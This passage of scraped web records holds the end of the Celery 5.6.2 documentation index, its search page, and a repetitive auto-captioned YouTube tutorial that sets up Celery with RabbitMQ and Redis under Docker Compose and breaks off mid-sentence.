attribute)\ntime_limit() (celery.app.control.Control method)\ntime_limits (celery.worker.request.Request attribute)\ntime_start (celery.worker.request.Request attribute)\ntime_to_live_seconds (celery.backends.dynamodb.DynamoDBBackend attribute)\nTimeLimitExceeded\ntimeout (celery.backends.couchbase.CouchbaseBackend attribute)\nTimeoutError\ntimer, [1]\n(celery.events.snapshot.Polaroid attribute)\n(celery.worker.consumer.Consumer attribute)\n(celery.worker.consumer.consumer.Consumer attribute)\nTimer (class in celery.utils.timer2)\n(class in celery.worker.components)\nTimer.Entry (class in celery.utils.timer2)\ntimestamp (celery.events.state.State.Task attribute)\n(celery.events.state.Task attribute)\ntimezone\nsetting\ntimezone (celery.app.utils.Settings property)\n(celery.Celery attribute)\nto_dict() (celery.backends.database.models.Task method)\n(celery.backends.database.models.TaskExtended method)\n(celery.backends.database.models.TaskSet method)\nto_dot() (celery.utils.graph.DependencyGraph method)\nto_python() (celery.app.defaults.Option method)\nto_timestamp() (in module celery.utils.timer2)\nto_utc() (in module celery.utils.time)\ntopsort() (celery.utils.graph.DependencyGraph method)\ntotal (celery.utils.collections.BufferMap attribute)\ntotal_apx (celery.contrib.migrate.State attribute)\ntotal_blocks (celery.utils.sysinfo.df property)\ntotal_count (in module celery.worker.state)\ntotal_run_count (celery.beat.ScheduleEntry attribute)\ntrace_task() (in module celery.app.trace)\ntraceback (celery.backends.database.models.Task attribute)\n(celery.backends.database.models.TaskExtended attribute)\n(celery.events.state.State.Task attribute)\n(celery.events.state.Task attribute)\n(celery.result.AsyncResult property)\n(celery.result.EagerResult property)\nTraceInfo (class in celery.app.trace)\ntrack_started (celery.app.task.Task attribute)\n(Task attribute)\ntrail (celery.app.task.Task attribute)\nTRANSIENT_DELIVERY_MODE (celery.backends.rpc.RPCBackend.Exchange attribute)\nTrap (class in celery.contrib.testing.app)\ntref (celery.concurrency.base.BasePool.Timer.Entry attribute)\n(celery.utils.timer2.Entry attribute)\n(celery.utils.timer2.Timer.Entry attribute)\ntrue_or_raise() (celery.contrib.testing.manager.ManagerMixin method)\ntruncate() (in module celery.utils.text)\nTYPE\ncelery-amqp-exchange.declare command line option\ntype (celery.app.control.Control.Mailbox attribute)\n(celery.backends.rpc.RPCBackend.Exchange attribute), [1]\n(celery.utils.abstract.CallableSignature property)\n(celery.worker.request.Request property)\ntypemap (celery.app.defaults.Option attribute)\ntyping (celery.app.task.Task attribute)\ntzlocal (celery.worker.request.Request property)\ntzname() (celery.utils.time.LocalTimezone method)\nU\nunbind_from() (celery.backends.rpc.RPCBackend.Exchange method)\nunderline() (celery.utils.term.colored method)\nuniq() (in module celery.utils.functional)\nUnitLogging (class in celery.contrib.testing.app)\nUnpickleableExceptionWrapper\nUNREADY_STATES\nstate\nunregister() (celery.app.registry.TaskRegistry method)\nupdate() (celery.beat.ScheduleEntry method)\n(celery.events.state.State.Worker method)\n(celery.events.state.Worker method)\n(celery.result.ResultSet method)\n(celery.utils.collections.ChainMap method)\n(celery.utils.collections.LimitedSet method)\n(celery.utils.functional.LRUCache method)\n(celery.utils.graph.DependencyGraph method)\n(celery.worker.autoscale.Autoscaler method)\nupdate_from_dict() (celery.beat.Scheduler method)\n\t\nupdate_state() (celery.app.task.Task method)\nupdate_strategies() (celery.worker.consumer.Consumer method)\n(celery.worker.consumer.consumer.Consumer method)\nuse_celery_app_trap() (in module celery.contrib.pytest)\nUSE_FAST_LOCALS\nuser (celery.backends.mongodb.MongoBackend attribute)\nuser_options (celery.Celery attribute)\nuser_preload_options\nsignal\nusername (celery.backends.arangodb.ArangoDbBackend attribute)\n(celery.backends.couchbase.CouchbaseBackend attribute)\n(celery.backends.couchdb.CouchBackend attribute)\n(celery.backends.elasticsearch.ElasticsearchBackend attribute)\nuses_semaphore (celery.concurrency.base.BasePool attribute)\n(celery.concurrency.prefork.TaskPool attribute)\nutc (celery.worker.request.Request property)\nutcoffset() (celery.utils.time.LocalTimezone method)\n(in module celery.utils.time)\nuuid() (in module celery.utils)\nV\nvalency_of() (celery.utils.graph.DependencyGraph method)\nvalidate_arguments() (celery.bin.multi.MultiTool method)\nvalue_set_for() (celery.app.utils.Settings method)\nvalues() (celery.utils.collections.ChainMap method)\n(celery.utils.collections.DictAttribute method)\n(celery.utils.functional.LRUCache method)\n\t\nverify (celery.backends.arangodb.ArangoDbBackend attribute)\nverify() (celery.security.certificate.Certificate method)\nW\nwait() (celery.result.AsyncResult method)\n(celery.result.EagerResult method)\nwait_for() (celery.backends.asynchronous.Drainer method)\n(celery.backends.base.DisabledBackend method)\n(celery.contrib.testing.manager.ManagerMixin method)\nwait_for_pending() (celery.backends.asynchronous.AsyncBackendMixin method)\nwait_for_soft_shutdown() (celery.worker.WorkController method)\n(celery.worker.worker.WorkController method)\nwait_until_idle() (celery.contrib.testing.manager.ManagerMixin method)\nwaiting() (celery.result.ResultSet method)\nwakeup_workers() (celery.events.EventReceiver method)\n(celery.events.receiver.EventReceiver method)\nwarn() (in module celery.utils.deprecated)\nweekday() (in module celery.utils.time)\nwhen (celery.exceptions.Retry attribute)\nwhite() (celery.utils.term.colored method)\nwin (celery.events.cursesmon.CursesMonitor attribute)\nwithout_defaults() (celery.app.utils.Settings method)\nWorkController (celery.Celery attribute)\n(class in celery.worker)\n(class in celery.worker.worker)\nWorkController.Blueprint (class in celery.worker)\n(class in celery.worker.worker)\nworker (celery.backends.database.models.TaskExtended attribute)\nWorker (celery.Celery attribute)\nworker (celery.events.state.State.Task attribute)\n(celery.events.state.Task attribute)\n(celery.result.AsyncResult property)\nWorker (class in celery.apps.worker)\n(class in celery.events.state)\nworker-heartbeat\nevent\nworker-offline\nevent\nworker-online\nevent\nworker_autoscaler\nsetting\nworker_before_create_process\nsignal\nworker_cancel_long_running_tasks_on_connection_loss\nsetting\nworker_concurrency\nsetting\nworker_consumer\nsetting\nworker_deduplicate_successful_tasks\nsetting\nworker_detect_quorum_queues\nsetting\nworker_direct\nsetting\nworker_direct() (in module celery.utils)\n(in module celery.utils.nodenames)\nworker_disable_prefetch\nsetting\nworker_disable_rate_limits\nsetting\nworker_enable_prefetch_count_reduction\nsetting\nworker_enable_remote_control\nsetting\nworker_enable_soft_shutdown_on_idle\nsetting\nworker_eta_task_limit\nsetting\nworker_event() (celery.events.state.State method)\nworker_executable\nsetting\nworker_gid\nsetting\n\t\nworker_hijack_root_logger\nsetting\nworker_init\nsignal\nworker_initialized (celery.loaders.base.BaseLoader attribute)\nworker_log_color\nsetting\nworker_log_format\nsetting\nworker_logfile\nsetting\nworker_lost_wait\nsetting\nworker_max_memory_per_child\nsetting\nworker_max_tasks_per_child\nsetting\nworker_pid (celery.worker.request.Request attribute)\nworker_pidfile\nsetting\nworker_pool\nsetting\nworker_pool_restarts\nsetting\nworker_prefetch_multiplier\nsetting\nworker_proc_alive_timeout\nsetting\nworker_process_init\nsignal\nworker_process_shutdown\nsignal\nworker_ready\nsignal\nworker_redirect_stdouts\nsetting\nworker_redirect_stdouts_level\nsetting\nworker_send_task_events\nsetting\nworker_shutdown\nsignal\nworker_shutting_down\nsignal\nworker_soft_shutdown_timeout\nsetting\nworker_state_db\nsetting\nworker_task_log_format\nsetting\nworker_timer\nsetting\nworker_timer_precision\nsetting\nworker_uid\nsetting\nworker_umask\nsetting\nWorkerComponent (class in celery.worker.autoscale)\nWorkerLostError\nworkers (celery.events.cursesmon.CursesMonitor property)\nWorkerShutdown\nWorkersPool (class in celery.bin.worker)\nWorkerTerminate\nwrite() (celery.utils.log.LoggingProxy method)\nwrite_capacity_units (celery.backends.dynamodb.DynamoDBBackend attribute)\nwrite_pid() (celery.platforms.Pidfile method)\nwrite_stats (celery.concurrency.prefork.TaskPool attribute)\nwritelines() (celery.utils.log.LoggingProxy method)\nY\nyellow() (celery.utils.term.colored method)\n\nDonations\n\nPlease help support this community project with a donation.\n\nQuick search\nindex\nmodules |\nCelery 5.6.2 documentation » Index\n© Copyright 2009-2023, Ask Solem & contributors."
  },
  {
    "id": 60491597,
    "timestamp": "2026-02-23T00:13:49.467Z",
    "title": "Search — Celery 5.6.2 documentation",
    "url": "https://docs.celeryq.dev/en/stable/search.html",
    "text": "index\nmodules |\nCelery 5.6.2 documentation » Search\nSearch\n\nSearching for multiple words only shows matches that contain all words.\n\n \n\nDonations\n\nPlease help support this community project with a donation.\n\nindex\nmodules |\nCelery 5.6.2 documentation » Search\n© Copyright 2009-2023, Ask Solem & contributors."
  },
  {
    "id": 60491640,
    "timestamp": "2026-02-23T00:14:51.508Z",
    "title": "Professional Task Queues in Python with Celery, RabbitMQ & Redis",
    "url": "https://www.youtube.com/watch?v=0gtdUkEzzn4",
    "text": "Today we're going to learn how to build\nToday we're going to learn how to build professional task cues in Python by\nprofessional task cues in Python by\nprofessional task cues in Python by using celery rabbit MQ and we're also\nusing celery rabbit MQ and we're also\nusing celery rabbit MQ and we're also going to mix in some Reddis. Now these\ngoing to mix in some Reddis. Now these\ngoing to mix in some Reddis. Now these are central technologies, central tools\nare central technologies, central tools\nare central technologies, central tools that you need if you want to build\nthat you need if you want to build\nthat you need if you want to build complex applications. So I think you're\ncomplex applications. So I think you're\ncomplex applications. So I think you're going to learn a lot today. If you like\ngoing to learn a lot today. If you like\ngoing to learn a lot today. If you like the video, let me know by hitting a like\nthe video, let me know by hitting a like\nthe video, let me know by hitting a like button and subscribing to the channel.\nbutton and subscribing to the channel.\nbutton and subscribing to the channel. But now let us get right into it.\nNow before we jump right into the\nNow before we jump right into the practical part, let's briefly cover what\npractical part, let's briefly cover what\npractical part, let's briefly cover what the individual tools are and how they\nthe individual tools are and how they\nthe individual tools are and how they relate to one another. Celery here is\nrelate to one another. Celery here is\nrelate to one another. Celery here is the central tool and the website says\nthe central tool and the website says\nthe central tool and the website says it's a simple, flexible and reliable\nit's a simple, flexible and reliable\nit's a simple, flexible and reliable distributed system to process vast\ndistributed system to process vast\ndistributed system to process vast amounts of messages. Basically with\namounts of messages. Basically with\namounts of messages. Basically with Celery we have two use cases. One is\nCelery we have two use cases. One is\nCelery we have two use cases. One is asynchronously processing tasks in cues\nasynchronously processing tasks in cues\nasynchronously processing tasks in cues and the other one is scheduling tasks on\nand the other one is scheduling tasks on\nand the other one is scheduling tasks on a regular basis. for example, every\na regular basis. for example, every\na regular basis. for example, every Wednesday at 2 p.m. or every 5 minutes.\nWednesday at 2 p.m. or every 5 minutes.\nWednesday at 2 p.m. or every 5 minutes. Additionally, it can distribute the work\nAdditionally, it can distribute the work\nAdditionally, it can distribute the work across multiple workers and machines,\nacross multiple workers and machines,\nacross multiple workers and machines, making it a distributed task Q. In this\nmaking it a distributed task Q. In this\nmaking it a distributed task Q. In this video today, we are going to touch on\nvideo today, we are going to touch on\nvideo today, we are going to touch on concurrency, but we're not actually\nconcurrency, but we're not actually\nconcurrency, but we're not actually going to use multiple machines. The\ngoing to use multiple machines. The\ngoing to use multiple machines. The interesting thing here is that celery\ninteresting thing here is that celery\ninteresting thing here is that celery basically communicates with itself. We\nbasically communicates with itself. We\nbasically communicates with itself. We have a celery client and a celery\nhave a celery client and a celery\nhave a celery client and a celery worker. In between, we have a message\nworker. In between, we have a message\nworker. In between, we have a message broker. We're going to talk about this\nbroker. We're going to talk about this\nbroker. We're going to talk about this in a second, but the idea is that the\nin a second, but the idea is that the\nin a second, but the idea is that the client submits a task that it wants to\nclient submits a task that it wants to\nclient submits a task that it wants to execute asynchronously to the message\nexecute asynchronously to the message\nexecute asynchronously to the message queue or to the message broker and the\nqueue or to the message broker and the\nqueue or to the message broker and the celery worker picks it up from there,\ncelery worker picks it up from there,\ncelery worker picks it up from there, pulls it out from there, processes it,\npulls it out from there, processes it,\npulls it out from there, processes it, and then stores the result in a backend,\nand then stores the result in a backend,\nand then stores the result in a backend, which is where Reddus comes in. We're\nwhich is where Reddus comes in. We're\nwhich is where Reddus comes in. We're going to talk about this in a second as\ngoing to talk about this in a second as\ngoing to talk about this in a second as well. So, what is the goal of the\nwell. So, what is the goal of the\nwell. So, what is the goal of the message broker? The main goal,\nmessage broker? The main goal,\nmessage broker? The main goal, especially in this scenario here, is to\nespecially in this scenario here, is to\nespecially in this scenario here, is to decouple the producer from the consumer.\ndecouple the producer from the consumer.\ndecouple the producer from the consumer. So, the client from the worker. client\nSo, the client from the worker. client\nSo, the client from the worker. client submits a task, produces a task and the\nsubmits a task, produces a task and the\nsubmits a task, produces a task and the worker consumes a task, processes a\nworker consumes a task, processes a\nworker consumes a task, processes a task. That is the basic idea. We want to\ntask. That is the basic idea. We want to\ntask. That is the basic idea. We want to decouple these two things so that they\ndecouple these two things so that they\ndecouple these two things so that they can work and communicate asynchronously.\ncan work and communicate asynchronously.\ncan work and communicate asynchronously. And what facilitates that is the message\nAnd what facilitates that is the message\nAnd what facilitates that is the message broker. Now, as the message broker, you\nbroker. Now, as the message broker, you\nbroker. Now, as the message broker, you can choose rabbit MQ, you can choose\ncan choose rabbit MQ, you can choose\ncan choose rabbit MQ, you can choose Reddis, you can also choose something\nReddis, you can also choose something\nReddis, you can also choose something else. The good thing about Rabbit MQ is\nelse. The good thing about Rabbit MQ is\nelse. The good thing about Rabbit MQ is that it also has mechanisms for\nthat it also has mechanisms for\nthat it also has mechanisms for guaranteeing delivery, for preventing\nguaranteeing delivery, for preventing\nguaranteeing delivery, for preventing message loss. So it's way more\nmessage loss. So it's way more\nmessage loss. So it's way more featurerich than something like Reddis.\nfeaturerich than something like Reddis.\nfeaturerich than something like Reddis. But you can also go with Reddis if you\nBut you can also go with Reddis if you\nBut you can also go with Reddis if you want to have a more minimal approach\nwant to have a more minimal approach\nwant to have a more minimal approach here. But at the end of the day, it's a\nhere. But at the end of the day, it's a\nhere. But at the end of the day, it's a matter of preference and a matter of\nmatter of preference and a matter of\nmatter of preference and a matter of what you need for your specific use\nwhat you need for your specific use\nwhat you need for your specific use case. As I said, Rabbit MQ is more\ncase. As I said, Rabbit MQ is more\ncase. As I said, Rabbit MQ is more featurerich. You can make a whole course\nfeaturerich. You can make a whole course\nfeaturerich. You can make a whole course about it. Reddus is more simple,\nabout it. Reddus is more simple,\nabout it. Reddus is more simple, straightforward, and doesn't have any\nstraightforward, and doesn't have any\nstraightforward, and doesn't have any mechanisms to guarantee that messages\nmechanisms to guarantee that messages\nmechanisms to guarantee that messages are resent in the case of a failure. And\nare resent in the case of a failure. And\nare resent in the case of a failure. And finally, there's the backend for salary,\nfinally, there's the backend for salary,\nfinally, there's the backend for salary, which is where the results end up. So if\nwhich is where the results end up. So if\nwhich is where the results end up. So if a salary task completes, sometimes it\na salary task completes, sometimes it\na salary task completes, sometimes it returns something. It doesn't have to\nreturns something. It doesn't have to\nreturns something. It doesn't have to return. You can also just take an\nreturn. You can also just take an\nreturn. You can also just take an action, produce a side effect, and then\naction, produce a side effect, and then\naction, produce a side effect, and then return nothing. This is also an option.\nreturn nothing. This is also an option.\nreturn nothing. This is also an option. But if you return something, it's going\nBut if you return something, it's going\nBut if you return something, it's going to end up in the back end. And the\nto end up in the back end. And the\nto end up in the back end. And the backend can literally be anything. It\nbackend can literally be anything. It\nbackend can literally be anything. It can be a Postgress database. It can be\ncan be a Postgress database. It can be\ncan be a Postgress database. It can be Reddius, it can be in memory, it can be\nReddius, it can be in memory, it can be\nReddius, it can be in memory, it can be Amazon S3. That's completely up to you.\nAmazon S3. That's completely up to you.\nAmazon S3. That's completely up to you. In our video today, in this video today,\nIn our video today, in this video today,\nIn our video today, in this video today, we're going to use Reddis in the first\nwe're going to use Reddis in the first\nwe're going to use Reddis in the first example or in the first couple of\nexample or in the first couple of\nexample or in the first couple of examples. And in a Django example, we're\nexamples. And in a Django example, we're\nexamples. And in a Django example, we're going to use the database that is\ngoing to use the database that is\ngoing to use the database that is associated with the Django application.\nassociated with the Django application.\nassociated with the Django application. In our case, that's going to be SQLite\nIn our case, that's going to be SQLite\nIn our case, that's going to be SQLite 3. But if you have your Django\n3. But if you have your Django\n3. But if you have your Django application set up to use Postgress,\napplication set up to use Postgress,\napplication set up to use Postgress, it's automatically going to go with\nit's automatically going to go with\nit's automatically going to go with Postgress. So to briefly summarize\nPostgress. So to briefly summarize\nPostgress. So to briefly summarize everything, the Celery client submits a\neverything, the Celery client submits a\neverything, the Celery client submits a task to the message broker. In our case,\ntask to the message broker. In our case,\ntask to the message broker. In our case, Rabbit MQ. This message broker handles\nRabbit MQ. This message broker handles\nRabbit MQ. This message broker handles buffering, queuing, reliable delivery.\nbuffering, queuing, reliable delivery.\nbuffering, queuing, reliable delivery. At some point the celery worker will\nAt some point the celery worker will\nAt some point the celery worker will pull out the task from the message queue\npull out the task from the message queue\npull out the task from the message queue process it and store the result if there\nprocess it and store the result if there\nprocess it and store the result if there is a result to be stored in the back end\nis a result to be stored in the back end\nis a result to be stored in the back end which can be reddis or whatever you set\nwhich can be reddis or whatever you set\nwhich can be reddis or whatever you set it up to be. That's it for the theory.\nit up to be. That's it for the theory.\nit up to be. That's it for the theory. Now let us move on with the practical\nNow let us move on with the practical\nNow let us move on with the practical part. All right. Now usually when you're\npart. All right. Now usually when you're\npart. All right. Now usually when you're using a text tech like this you're\nusing a text tech like this you're\nusing a text tech like this you're working on a more comprehensive\nworking on a more comprehensive\nworking on a more comprehensive application and you have a docker setup.\napplication and you have a docker setup.\napplication and you have a docker setup. So of course it's possible to install\nSo of course it's possible to install\nSo of course it's possible to install all of these components on your system.\nall of these components on your system.\nall of these components on your system. You can install Rabbit MQ, Reddis,\nYou can install Rabbit MQ, Reddis,\nYou can install Rabbit MQ, Reddis, Celery and run them natively on your\nCelery and run them natively on your\nCelery and run them natively on your system. But usually you're working on an\nsystem. But usually you're working on an\nsystem. But usually you're working on an application backend, front end, engine X\napplication backend, front end, engine X\napplication backend, front end, engine X and all this stuff and you have a Docker\nand all this stuff and you have a Docker\nand all this stuff and you have a Docker compose file and you just add these\ncompose file and you just add these\ncompose file and you just add these services in there. Since this is going\nservices in there. Since this is going\nservices in there. Since this is going to be the most likely way you work with\nto be the most likely way you work with\nto be the most likely way you work with these technologies. I'm going to do it\nthese technologies. I'm going to do it\nthese technologies. I'm going to do it like this. I'm not going to install the\nlike this. I'm not going to install the\nlike this. I'm not going to install the tools on my system. I'm going to write a\ntools on my system. I'm going to write a\ntools on my system. I'm going to write a Docker Compose file and then we're going\nDocker Compose file and then we're going\nDocker Compose file and then we're going to run all of this with Docker Compose.\nto run all of this with Docker Compose.\nto run all of this with Docker Compose. Now, if you don't know anything about\nNow, if you don't know anything about\nNow, if you don't know anything about Docker, I would recommend that you first\nDocker, I would recommend that you first\nDocker, I would recommend that you first check out a crash course on Docker. I\ncheck out a crash course on Docker. I\ncheck out a crash course on Docker. I have one on my channel. You can also\nhave one on my channel. You can also\nhave one on my channel. You can also watch someone else's crash course if you\nwatch someone else's crash course if you\nwatch someone else's crash course if you want to. But I think Docker is a\nwant to. But I think Docker is a\nwant to. But I think Docker is a prerequisite for understanding what\nprerequisite for understanding what\nprerequisite for understanding what we're doing here today. Not because it's\nwe're doing here today. Not because it's\nwe're doing here today. Not because it's a prerequisite for Celery, Rabbit and Q\na prerequisite for Celery, Rabbit and Q\na prerequisite for Celery, Rabbit and Q or Reddis, but because the whole setup\nor Reddis, but because the whole setup\nor Reddis, but because the whole setup here is going to be a Docker compos\nhere is going to be a Docker compos\nhere is going to be a Docker compos setup. So let us get started by creating\nsetup. So let us get started by creating\nsetup. So let us get started by creating a docker compose YAML file and defining\na docker compose YAML file and defining\na docker compose YAML file and defining our services. Now the first service that\nour services. Now the first service that\nour services. Now the first service that we define here is Rabbit MQ, our message\nwe define here is Rabbit MQ, our message\nwe define here is Rabbit MQ, our message broker. By the way, I'm going to copy\nbroker. By the way, I'm going to copy\nbroker. By the way, I'm going to copy paste these segments here to save time,\npaste these segments here to save time,\npaste these segments here to save time, but if this is too fast for you, you\nbut if this is too fast for you, you\nbut if this is too fast for you, you will find a link to my GitHub repository\nwill find a link to my GitHub repository\nwill find a link to my GitHub repository in a description down below. And there\nin a description down below. And there\nin a description down below. And there you will find all the files that we use\nyou will find all the files that we use\nyou will find all the files that we use in this video today. Now, for Rabbit MQ,\nin this video today. Now, for Rabbit MQ,\nin this video today. Now, for Rabbit MQ, we're using the image rabbit MQ3-\nwe're using the image rabbit MQ3-\nwe're using the image rabbit MQ3- management. And we're also setting two\nmanagement. And we're also setting two\nmanagement. And we're also setting two environment variables that will control\nenvironment variables that will control\nenvironment variables that will control the credentials for default user. I\nthe credentials for default user. I\nthe credentials for default user. I think by default, these are guest and\nthink by default, these are guest and\nthink by default, these are guest and guest. And by setting these environment\nguest. And by setting these environment\nguest. And by setting these environment variables, we change that to something\nvariables, we change that to something\nvariables, we change that to something that is custom. In my case here, I'm\nthat is custom. In my case here, I'm\nthat is custom. In my case here, I'm loading this from two other environment\nloading this from two other environment\nloading this from two other environment variables. These are going to be located\nvariables. These are going to be located\nvariables. These are going to be located in a file that we're going to create in\nin a file that we're going to create in\nin a file that we're going to create in a second called enth. There I'm going to\na second called enth. There I'm going to\na second called enth. There I'm going to put the credentials to have them in the\nput the credentials to have them in the\nput the credentials to have them in the central space. These are then\ncentral space. These are then\ncentral space. These are then automatically loaded from that file by\nautomatically loaded from that file by\nautomatically loaded from that file by docker compose. But you can of course\ndocker compose. But you can of course\ndocker compose. But you can of course also specify them here directly in the\nalso specify them here directly in the\nalso specify them here directly in the compose file. In addition to that, we\ncompose file. In addition to that, we\ncompose file. In addition to that, we define a volume in our case called\ndefine a volume in our case called\ndefine a volume in our case called rabbit mq data. This is to persist the\nrabbit mq data. This is to persist the\nrabbit mq data. This is to persist the data that rabbit MQ produces. For\ndata that rabbit MQ produces. For\ndata that rabbit MQ produces. For example, if the system crashes, but\nexample, if the system crashes, but\nexample, if the system crashes, but there's still a task in the queue, it's\nthere's still a task in the queue, it's\nthere's still a task in the queue, it's not going to be lost. It's persisted.\nnot going to be lost. It's persisted.\nnot going to be lost. It's persisted. It's on the disk. It's in the volume and\nIt's on the disk. It's in the volume and\nIt's on the disk. It's in the volume and can be used by any other container that\ncan be used by any other container that\ncan be used by any other container that mounts the same volume. Then we also map\nmounts the same volume. Then we also map\nmounts the same volume. Then we also map the port 15672. This is not the port for\nthe port 15672. This is not the port for\nthe port 15672. This is not the port for the actual communication, not the port\nthe actual communication, not the port\nthe actual communication, not the port for AMQP, the advanced message queuing\nfor AMQP, the advanced message queuing\nfor AMQP, the advanced message queuing protocol. This is for the management\nprotocol. This is for the management\nprotocol. This is for the management user interface. This is why we expose\nuser interface. This is why we expose\nuser interface. This is why we expose it. This is why we map it because we\nit. This is why we map it because we\nit. This is why we map it because we want to access it from the outside. The\nwant to access it from the outside. The\nwant to access it from the outside. The port that is used for the communication\nport that is used for the communication\nport that is used for the communication doesn't have to be mapped because it can\ndoesn't have to be mapped because it can\ndoesn't have to be mapped because it can stay in the network. The other services\nstay in the network. The other services\nstay in the network. The other services can access it anyway. And finally, we\ncan access it anyway. And finally, we\ncan access it anyway. And finally, we have a health check. This is important\nhave a health check. This is important\nhave a health check. This is important because other services are going to rely\nbecause other services are going to rely\nbecause other services are going to rely on rabbit MQ being started and being\non rabbit MQ being started and being\non rabbit MQ being started and being healthy, being active. And this is how\nhealthy, being active. And this is how\nhealthy, being active. And this is how we can check that this is actually the\nwe can check that this is actually the\nwe can check that this is actually the case. Next up, we have Reddis, which\ncase. Next up, we have Reddis, which\ncase. Next up, we have Reddis, which we're going to use as our results\nwe're going to use as our results\nwe're going to use as our results backend. Theoretically also possible to\nbackend. Theoretically also possible to\nbackend. Theoretically also possible to be used as a message broker. The image\nbe used as a message broker. The image\nbe used as a message broker. The image here is Reddis 7 Alpine. The command to\nhere is Reddis 7 Alpine. The command to\nhere is Reddis 7 Alpine. The command to start this is reddis server-safe61.\nstart this is reddis server-safe61.\nstart this is reddis server-safe61. This basically means if there's at least\nThis basically means if there's at least\nThis basically means if there's at least one change in the last 60 seconds write\none change in the last 60 seconds write\none change in the last 60 seconds write to disk. We also create a volume here\nto disk. We also create a volume here\nto disk. We also create a volume here reddis data to persist the reddis data\nreddis data to persist the reddis data\nreddis data to persist the reddis data and we also have a health check. Now the\nand we also have a health check. Now the\nand we also have a health check. Now the central part is the celery worker and\ncentral part is the celery worker and\ncentral part is the celery worker and the interesting thing is that the celery\nthe interesting thing is that the celery\nthe interesting thing is that the celery worker has the same build path or points\nworker has the same build path or points\nworker has the same build path or points to the same directory for building as\nto the same directory for building as\nto the same directory for building as the actual client. So the client and the\nthe actual client. So the client and the\nthe actual client. So the client and the worker are going to be in the same\nworker are going to be in the same\nworker are going to be in the same directory. This is the case now. This is\ndirectory. This is the case now. This is\ndirectory. This is the case now. This is also the case when we look at a Django\nalso the case when we look at a Django\nalso the case when we look at a Django application. Basically we say build\napplication. Basically we say build\napplication. Basically we say build current directory. This can also be\ncurrent directory. This can also be\ncurrent directory. This can also be backend for example. Then we have a\nbackend for example. Then we have a\nbackend for example. Then we have a command which says celery- a worker. So\ncommand which says celery- a worker. So\ncommand which says celery- a worker. So we have our worker application the\nwe have our worker application the\nwe have our worker application the command worker and this basically starts\ncommand worker and this basically starts\ncommand worker and this basically starts our celery worker. We say that we want\nour celery worker. We say that we want\nour celery worker. We say that we want to load the environment variables from\nto load the environment variables from\nto load the environment variables from which we still need to create. And then\nwhich we still need to create. And then\nwhich we still need to create. And then we have this depends on condition.\nwe have this depends on condition.\nwe have this depends on condition. Rabbit MQ and Reddis both have to be up\nRabbit MQ and Reddis both have to be up\nRabbit MQ and Reddis both have to be up and healthy. And the last service is our\nand healthy. And the last service is our\nand healthy. And the last service is our client. So this is the celery client. In\nclient. So this is the celery client. In\nclient. So this is the celery client. In our case, again, it's going to build\nour case, again, it's going to build\nour case, again, it's going to build current directory. If you had backend\ncurrent directory. If you had backend\ncurrent directory. If you had backend here, you would also put backend here or\nhere, you would also put backend here or\nhere, you would also put backend here or whatever you call this. The command here\nwhatever you call this. The command here\nwhatever you call this. The command here is just running a Python script that we\nis just running a Python script that we\nis just running a Python script that we don't have yet. And then it also loads\ndon't have yet. And then it also loads\ndon't have yet. And then it also loads the environment variables because\nthe environment variables because\nthe environment variables because they're going to be used there. And it\nthey're going to be used there. And it\nthey're going to be used there. And it depends on rabbit MQ and Reddis being\ndepends on rabbit MQ and Reddis being\ndepends on rabbit MQ and Reddis being healthy. and it depends on the celery\nhealthy. and it depends on the celery\nhealthy. and it depends on the celery worker at least having started. Now let\nworker at least having started. Now let\nworker at least having started. Now let us set up our environment variables. For\nus set up our environment variables. For\nus set up our environment variables. For this I'm going to create a file called\nthis I'm going to create a file called\nthis I'm going to create a file called and we're going to put here the rabbit\nand we're going to put here the rabbit\nand we're going to put here the rabbit mq credentials as well as the paths that\nmq credentials as well as the paths that\nmq credentials as well as the paths that celery is going to need. So for rabbit\ncelery is going to need. So for rabbit\ncelery is going to need. So for rabbit mq I'm just going to specify rabbit mq\nmq I'm just going to specify rabbit mq\nmq I'm just going to specify rabbit mq user rabbit mq pass and I'm going to\nuser rabbit mq pass and I'm going to\nuser rabbit mq pass and I'm going to call them custom user custom password.\ncall them custom user custom password.\ncall them custom user custom password. Quite simple in production of course use\nQuite simple in production of course use\nQuite simple in production of course use something safer. And for celery I'm\nsomething safer. And for celery I'm\nsomething safer. And for celery I'm going to define the broker and the\ngoing to define the broker and the\ngoing to define the broker and the backend URL. So the broker URL is the\nbackend URL. So the broker URL is the\nbackend URL. So the broker URL is the path to rabbit MQ in our case here AMQP\npath to rabbit MQ in our case here AMQP\npath to rabbit MQ in our case here AMQP advanced message queuing protocol custom\nadvanced message queuing protocol custom\nadvanced message queuing protocol custom user custom password. These are the\nuser custom password. These are the\nuser custom password. These are the credentials up here at rabbit MQ which\ncredentials up here at rabbit MQ which\ncredentials up here at rabbit MQ which we can use because we defined it in the\nwe can use because we defined it in the\nwe can use because we defined it in the docker compose file and then the port\ndocker compose file and then the port\ndocker compose file and then the port number 5672 which is the AMQP port\nnumber 5672 which is the AMQP port\nnumber 5672 which is the AMQP port number. For the back end we just specify\nnumber. For the back end we just specify\nnumber. For the back end we just specify reddis reddis again because we defined\nreddis reddis again because we defined\nreddis reddis again because we defined it in the docker compose 6379 because\nit in the docker compose 6379 because\nit in the docker compose 6379 because that's the port for reddis. So whatever\nthat's the port for reddis. So whatever\nthat's the port for reddis. So whatever you call these in the docker compose\nyou call these in the docker compose\nyou call these in the docker compose file, you can just use these names\nfile, you can just use these names\nfile, you can just use these names instead of localhost or IP addresses. So\ninstead of localhost or IP addresses. So\ninstead of localhost or IP addresses. So in this video, I want to show you\nin this video, I want to show you\nin this video, I want to show you multiple examples of how to use celery\nmultiple examples of how to use celery\nmultiple examples of how to use celery and rabbit MQ in Python. But we're going\nand rabbit MQ in Python. But we're going\nand rabbit MQ in Python. But we're going to start with a very very simple and\nto start with a very very simple and\nto start with a very very simple and trivial example. I'm going to define a\ntrivial example. I'm going to define a\ntrivial example. I'm going to define a file called worker py. And the only\nfile called worker py. And the only\nfile called worker py. And the only thing we're going to do is we're going\nthing we're going to do is we're going\nthing we're going to do is we're going to have a task here that randomly\nto have a task here that randomly\nto have a task here that randomly outputs a number with some delay. So\noutputs a number with some delay. So\noutputs a number with some delay. So these are going to be our imports. We're\nthese are going to be our imports. We're\nthese are going to be our imports. We're importing OS so we can access\nimporting OS so we can access\nimporting OS so we can access environment variables. We're importing\nenvironment variables. We're importing\nenvironment variables. We're importing time for the delay and random for the\ntime for the delay and random for the\ntime for the delay and random for the random number generation. And then of\nrandom number generation. And then of\nrandom number generation. And then of course we also import celery from\ncourse we also import celery from\ncourse we also import celery from celery. The first thing that we then do\ncelery. The first thing that we then do\ncelery. The first thing that we then do here is we define an application. So an\nhere is we define an application. So an\nhere is we define an application. So an instance of celery. In our case we 